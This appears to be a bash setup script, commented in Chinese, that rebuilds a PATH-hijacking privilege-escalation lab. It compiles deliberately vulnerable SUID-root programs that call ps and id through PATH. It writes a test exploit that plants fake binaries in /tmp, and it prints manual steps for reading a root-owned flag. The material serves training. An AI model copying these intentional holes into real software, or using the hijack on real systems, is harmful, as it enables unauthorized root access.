#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] 修復 PATH Hijacking Lab...${NC}"

# 檢查 root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] 需要 root 權限${NC}"
    exit 1
fi

# 重新編譯 monitor（最簡單版本）
echo -e "${YELLOW}[*] 重新編譯 monitor...${NC}"
cat > /tmp/monitor_fixed.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("System Monitor v1.0\n");
    printf("===================\n");
    
    // 不要降權，保持 EUID
    printf("UID=%d, EUID=%d\n", getuid(), geteuid());
    
    // 使用 execvp - 這個一定會搜尋 PATH
    char *args[] = {"ps", "aux", NULL};
    execvp("ps", args);
    
    // 如果 execvp 失敗
    perror("execvp failed");
    return 1;
}
EOF

gcc -o /opt/lab/b/vuln/monitor /tmp/monitor_fixed.c
chown root:root /opt/lab/b/vuln/monitor
chmod 4755 /opt/lab/b/vuln/monitor

# 重新編譯 maintenance（標準版本）
echo -e "${YELLOW}[*] 重新編譯 maintenance...${NC}"
cat > /tmp/maintenance_fixed.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("System Maintenance Tool v1.0\n");
    printf("=============================\n");
    
    // 顯示權限資訊
    printf("Running as: UID=%d, EUID=%d\n", getuid(), geteuid());
    
    // 如果是 SUID，設定 real UID = effective UID
    if (geteuid() == 0) {
        setuid(0);
        setgid(0);
        printf("Elevated to root!\n");
    }
    
    printf("\n[*] Checking processes:\n");
    
    // 使用 execvp 而不是 system
    char *args[] = {"ps", NULL};
    execvp("ps", args);
    
    perror("execvp");
    return 1;
}
EOF

gcc -o /opt/lab/b/vuln/maintenance /tmp/maintenance_fixed.c
chown root:root /opt/lab/b/vuln/maintenance
chmod 4755 /opt/lab/b/vuln/maintenance

# 創建一個超級簡單的測試程式
echo -e "${YELLOW}[*] 創建 easy_target...${NC}"
cat > /tmp/easy_target.c << 'EOF'
#include <unistd.h>
#include <stdio.h>

int main() {
    printf("Easy Target - Just runs 'id'\n");
    
    // 保持 root
    if (geteuid() == 0) {
        setuid(0);
        setgid(0);
    }
    
    // 直接 execvp id
    char *args[] = {"id", NULL};
    execvp("id", args);
    
    return 0;
}
EOF

gcc -o /opt/lab/b/vuln/easy_target /tmp/easy_target.c
chown root:root /opt/lab/b/vuln/easy_target
chmod 4755 /opt/lab/b/vuln/easy_target

# 創建 Python 版本（最可靠）
echo -e "${YELLOW}[*] 創建 Python 版本...${NC}"
cat > /opt/lab/b/vuln/python_vuln.py << 'EOF'
#!/usr/bin/python3
import os
import subprocess

print("Python Vulnerable Script v1.0")
print("==============================")

# 保持 root 權限
if os.geteuid() == 0:
    os.setuid(0)
    os.setgid(0)
    print(f"Running as: UID={os.getuid()}, EUID={os.geteuid()}")

# 使用 subprocess 呼叫 ps（會搜尋 PATH）
print("\nRunning ps command...")
subprocess.call(["ps", "aux"])
EOF

chmod +x /opt/lab/b/vuln/python_vuln.py
chown root:root /opt/lab/b/vuln/python_vuln.py
chmod 4755 /opt/lab/b/vuln/python_vuln.py

# 測試新的程式
echo -e "${YELLOW}[*] 測試新程式...${NC}"

# 創建測試 exploit
cat > /tmp/test_id << 'EOF'
#!/bin/bash
echo "[HIJACKED] id command executed!"
echo "Real UID: $(id -ru)"
echo "Effective UID: $(id -u)"
/usr/bin/id
EOF
chmod +x /tmp/test_id

# 測試 easy_target
echo -e "${GREEN}[*] 測試 easy_target:${NC}"
PATH=/tmp:$PATH /opt/lab/b/vuln/easy_target

# 清理
rm -f /tmp/test_id

# 創建新的測試腳本
cat > /opt/lab/b/test_exploit.sh << 'EOF'
#!/bin/bash

echo "=== Manual Exploit Test ==="
echo ""

# 測試用的 exploit
cat > /tmp/ps << 'EXPLOIT'
#!/bin/bash
echo "[SUCCESS] PATH Hijack Working!"
echo "Current user: $(whoami)"
echo "ID: $(id)"
EXPLOIT
chmod +x /tmp/ps

echo "[1] Testing monitor:"
PATH=/tmp:$PATH /opt/lab/b/vuln/monitor 2>&1 | head -5
echo ""

echo "[2] Testing maintenance:"
PATH=/tmp:$PATH /opt/lab/b/vuln/maintenance 2>&1 | head -5
echo ""

echo "[3] Testing easy_target:"
cat > /tmp/id << 'EXPLOIT2'
#!/bin/bash
echo "[SUCCESS] ID Hijacked!"
/usr/bin/id
EXPLOIT2
chmod +x /tmp/id
PATH=/tmp:$PATH /opt/lab/b/vuln/easy_target 2>&1 | head -5
echo ""

# 清理
rm -f /tmp/ps /tmp/id

echo "=== Test Complete ==="
EOF
chmod +x /opt/lab/b/test_exploit.sh

echo ""
echo -e "${GREEN}[✓] 修復完成！${NC}"
echo ""
echo -e "${YELLOW}可用的 SUID 程式：${NC}"
ls -la /opt/lab/b/vuln/ | grep -E "^-rws|^-rwx.*\.py"
echo ""
echo -e "${YELLOW}測試方法：${NC}"
echo "1. 切換用戶: ${GREEN}su - kali${NC}"
echo "2. 執行測試: ${GREEN}/opt/lab/b/test_exploit.sh${NC}"
echo ""
echo -e "${YELLOW}手動 exploit：${NC}"
cat << 'EXAMPLE'
# 創建惡意 ps
echo '#!/bin/bash' > /tmp/ps
echo 'cat /opt/lab/b/root/flag8.txt' >> /tmp/ps
chmod +x /tmp/ps

# 執行攻擊
PATH=/tmp:$PATH /opt/lab/b/vuln/monitor

# 或用 easy_target
echo '#!/bin/bash' > /tmp/id
echo 'cat /opt/lab/b/root/flag8.txt' >> /tmp/id  
chmod +x /tmp/id
PATH=/tmp:$PATH /opt/lab/b/vuln/easy_target
EXAMPLE